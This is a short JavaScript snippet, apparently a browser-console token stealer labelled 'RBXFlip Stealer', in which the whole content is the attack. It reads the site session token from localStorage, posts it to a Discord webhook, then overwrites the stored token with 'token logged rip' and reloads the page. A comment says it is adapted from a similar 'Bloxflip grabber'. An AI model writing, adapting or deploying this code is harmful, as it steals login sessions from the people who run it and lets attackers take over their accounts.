{
  const webhook = "";

  const token = window.localStorage["accessToken"]; 
  // Really the only difference between this and the Bloxflip grabber is the name of the localStorage key where the token is stored
  const request = new XMLHttpRequest();
  request.open("POST", "WEBHOOK");
  request.setRequestHeader("Content-type", "application/json");
  request.send(
    JSON.stringify({
      username: "RBXFlip Stealer",
      avatar_url:
        "https://media.discordapp.net/attachments/953476600421314601/964288523387678770/Screen_Shot_2022-04-14_at_3.15.10_PM.png?width=461&height=461", // my way of giving myself credits
      content: "**Token**\n```" + token + "```",
    })
  );

  
  window.localStorage["accessToken"] = "token logged rip";
  location.reload(); 
}
